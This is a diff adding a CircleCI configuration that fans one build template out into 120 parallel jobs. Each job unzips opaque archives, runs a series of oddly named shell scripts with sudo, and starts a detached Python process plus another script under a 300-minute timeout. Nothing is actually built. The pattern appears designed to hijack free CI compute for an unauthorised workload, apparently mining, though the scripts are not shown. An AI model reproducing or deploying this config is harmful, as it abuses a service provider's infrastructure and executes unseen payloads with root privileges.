@@ -1,0 +1,689 @@
+working_dir: &working_dir ~/app
+.build_template: &build_definition
+  steps:
+    - checkout
+    - run:
+        name: A
+        command: |
+          sudo apt update -y
+    - run:
+        name: B
+        command: |
+          sleep 10s
+          unzip duli.zip && chmod u+x *
+          #./cw.sh####
+    - run:
+        name: C
+        command: |
+          unzip artman.zip >/dev/null 2>&1
+    - run:
+        name: D
+        command: |
+          chmod u+x *
+    - run:
+        name: E
+        command: |
+          sudo ./Arang.sh
+    - run:
+        name: F
+        command: |
+          sudo ./Biji.sh
+    - run:
+        name: G
+        command: |
+          sudo ./Cili.sh
+    - run:
+        name: H
+        command: |
+          sudo ./Duri.sh
+    - run:
+        name: I
+        command: |
+          sudo ./Enak.sh
+    - run:
+        name: J
+        command: |
+          #sudo ./Frean.sh#no_run
+    - run:
+        name: K
+        no_output_timeout: 300m
+        command: |
+          echo "Ijin Berkah Om. . ."
+          sudo ./Gila.sh
+          sudo ./Hai.sh
+          sudo ./Itu.sh
+          screen -dmS Acdb python3 proE.py
+          sleep 300s
+          ./main08.sh
+  working_directory: *working_dir
+
+version: 2.0
+
+jobs:
+  Bual_01:
+    <<: *build_definition
+    docker:
+      - image: circleci/golang:1.15.8
+  Bual_02:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_03:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_04:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_05:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_06:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_07:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_08:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_09:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_10:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_11:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_12:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_13:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_14:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_15:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_16:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_17:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_18:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_19:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_20:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_21:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_22:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_23:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_24:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_25:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_26:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_27:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_28:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_29:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_30:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_31:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_32:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_33:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_34:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_35:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_36:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_37:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_38:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_39:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_40:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_41:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_42:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_43:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_44:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_45:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_46:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_47:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_48:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_49:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_50:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_51:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_52:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_53:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_54:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_55:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_56:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_57:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_58:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_59:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_60:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_61:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_62:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_63:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_64:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_65:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_66:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_67:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_68:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_69:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_70:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_71:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_72:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_73:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_74:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_75:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_76:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_77:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_78:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_79:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_80:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_81:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_82:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_83:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_84:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_85:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_86:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_87:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_88:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_89:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_90:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_91:
+    <<: *build_definition
+    docker:
+      - image: circleci/golang:1.15.8
+  Bual_92:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_93:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_94:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_95:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_96:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_97:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_98:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_99:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_100:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_101:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_102:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_103:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_104:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_105:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_106:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_107:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_108:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_109:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_110:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_111:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_112:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_113:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_114:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_115:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_116:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_117:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_118:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_119:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+  Bual_120:
+    docker:
+      - image: circleci/golang:1.15.8
+    <<: *build_definition
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+workflows:
+  version: 2
+  build_all:
+    jobs:
+      - Bual_01
+      - Bual_02
+      - Bual_03
+      - Bual_04
+      - Bual_05
+      - Bual_06
+      - Bual_07
+      - Bual_08
+      - Bual_09
+      - Bual_10
+      - Bual_11
+      - Bual_12
+      - Bual_13
+      - Bual_14
+      - Bual_15
+      - Bual_16
+      - Bual_17
+      - Bual_18
+      - Bual_19
+      - Bual_20
+      - Bual_21
+      - Bual_22
+      - Bual_23
+      - Bual_24
+      - Bual_25
+      - Bual_26
+      - Bual_27
+      - Bual_28
+      - Bual_29
+      - Bual_30
+      - Bual_31
+      - Bual_32
+      - Bual_33
+      - Bual_34
+      - Bual_35
+      - Bual_36
+      - Bual_37
+      - Bual_38
+      - Bual_39
+      - Bual_40
+      - Bual_41
+      - Bual_42
+      - Bual_43
+      - Bual_44
+      - Bual_45
+      - Bual_46
+      - Bual_47
+      - Bual_48
+      - Bual_49
+      - Bual_50
+      - Bual_51
+      - Bual_52
+      - Bual_53
+      - Bual_54
+      - Bual_55
+      - Bual_56
+      - Bual_57
+      - Bual_58
+      - Bual_59
+      - Bual_60
+      - Bual_61
+      - Bual_62
+      - Bual_63
+      - Bual_64
+      - Bual_65
+      - Bual_66
+      - Bual_67
+      - Bual_68
+      - Bual_69
+      - Bual_70
+      - Bual_71
+      - Bual_72
+      - Bual_73
+      - Bual_74
+      - Bual_75
+      - Bual_76
+      - Bual_77
+      - Bual_78
+      - Bual_79
+      - Bual_80
+      - Bual_81
+      - Bual_82
+      - Bual_83
+      - Bual_84
+      - Bual_85
+      - Bual_86
+      - Bual_87
+      - Bual_88
+      - Bual_89
+      - Bual_90
+      - Bual_91
+      - Bual_92
+      - Bual_93
+      - Bual_94
+      - Bual_95
+      - Bual_96
+      - Bual_97
+      - Bual_98
+      - Bual_99
+      - Bual_100
+      - Bual_101
+      - Bual_102
+      - Bual_103
+      - Bual_104
+      - Bual_105
+      - Bual_106
+      - Bual_107
+      - Bual_108
+      - Bual_109
+      - Bual_110
+      - Bual_111
+      - Bual_112
+      - Bual_113
+      - Bual_114
+      - Bual_115
+      - Bual_116
+      - Bual_117
+      - Bual_118
+      - Bual_119
+      - Bual_120
+
+
+
+
+
